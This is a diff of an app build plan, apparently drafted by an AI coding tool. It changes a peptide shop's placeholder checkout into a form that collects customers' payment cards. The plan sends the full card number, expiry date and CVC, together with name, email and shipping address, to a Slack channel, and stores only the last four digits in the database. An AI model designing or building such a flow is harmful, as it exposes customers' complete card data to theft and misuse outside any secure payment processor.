@@ -1,67 +1,48 @@
 
 
-## Checkout Flow (No Payment Processing)
+## Credit Card Collection with Slack Notification
 
-Build a complete checkout experience with shipping information collection, order review, confirmation -- but without real payment processing for now. Orders will be saved to the database for future payment integration.
+Collect card details at checkout, send full order and card info to the **#activ-peptides-orders** Slack channel, and store only the last 4 digits of the card in the database.
 
-### Database Changes
+### Step 1: Connect Slack
 
-**New `orders` table:**
+You'll be prompted to connect a Slack bot to your workspace. After connecting, you'll need to **invite the bot to the #activ-peptides-orders channel** (since it's likely a private channel). You can do this by typing `/invite @Lovable App` in that channel.
 
-| Column | Type | Description |
-|--------|------|-------------|
-| id | uuid (PK) | Auto-generated |
-| user_id | uuid | Links to auth user |
-| status | text | "pending", "confirmed", "shipped", etc. Default: "pending" |
-| subtotal | numeric | Cart subtotal at time of order |
-| shipping_name | text | Full name |
-| shipping_email | text | Email address |
-| shipping_address | text | Street address |
-| shipping_city | text | City |
-| shipping_state | text | State/province |
-| shipping_zip | text | Postal code |
-| created_at | timestamptz | Auto-generated |
+### Step 2: Database Changes
 
-**New `order_items` table:**
+Add one column to the `orders` table:
 
 | Column | Type | Description |
 |--------|------|-------------|
-| id | uuid (PK) | Auto-generated |
-| order_id | uuid (FK -> orders) | Links to parent order |
-| product_id | uuid (FK -> products) | Product purchased |
-| quantity | integer | Quantity ordered |
-| price_at_time | numeric | Snapshot of price at purchase |
+| card_last4 | text | Last 4 digits only (e.g. "4242") |
 
-**RLS Policies:** Users can insert their own orders and view their own orders. Admins can view all orders.
+No full card data is ever stored in the database.
 
-### New Pages
+### Step 3: Backend Function
 
-1. **`src/pages/CheckoutPage.tsx`**
-   - Multi-step or single-page form with:
-     - **Order Summary**: List of cart items with quantities and prices
-     - **Shipping Information**: Name, email, address, city, state, zip (validated with zod + react-hook-form)
-     - **Place Order button**: Saves order + order items to database, clears cart, redirects to confirmation
-   - Dark theme consistent with existing pages
+Create a `send-card-to-slack` backend function that posts a formatted message to **#activ-peptides-orders** containing:
 
-2. **`src/pages/OrderConfirmationPage.tsx`**
-   - Shows order ID, items ordered, shipping details, and a "Continue Shopping" button
-   - Fetches the order from the database by ID from URL params
+- **Order ID**
+- **Customer name and email**
+- **Full card number, expiry, and CVC**
+- **Subtotal and total**
+- **Full shipping address** (name, street, city, state, ZIP)
 
-### Cart Changes
+The function uses the Slack connector gateway and requires authentication.
 
-- **`useCart.tsx`**: Add a `clearCart()` method that deletes all cart items for the user
-- **`CartDrawer.tsx`**: Update "Checkout" button to navigate to `/app/checkout` instead of showing a toast
+### Step 4: Checkout Page Updates
 
-### Routing
+Update `src/pages/CheckoutPage.tsx` to:
 
-Add two new routes inside the `/app` group:
-- `checkout` -> `CheckoutPage`
-- `order-confirmation/:orderId` -> `OrderConfirmationPage`
+- Add card input fields (Card Number, Expiry MM/YY, CVC) with auto-formatting
+- On submit:
+  1. Save order with only `card_last4` in the database
+  2. Save order items
+  3. Call the backend function to send full details to Slack
+  4. Clear cart and redirect to confirmation
+  5. If the Slack notification fails, the order still completes successfully
 
-### Technical Details
+### After Setup
 
-- Checkout uses `react-hook-form` with `zod` validation for shipping fields
-- On "Place Order": insert into `orders`, then bulk insert into `order_items` with price snapshots, then clear cart items, then navigate to confirmation
-- All operations run in sequence to ensure data integrity
-- Loading state on the submit button to prevent double-clicks
+You will need to invite the Slack bot to **#activ-peptides-orders** by typing `/invite @Lovable App` in that channel.
 
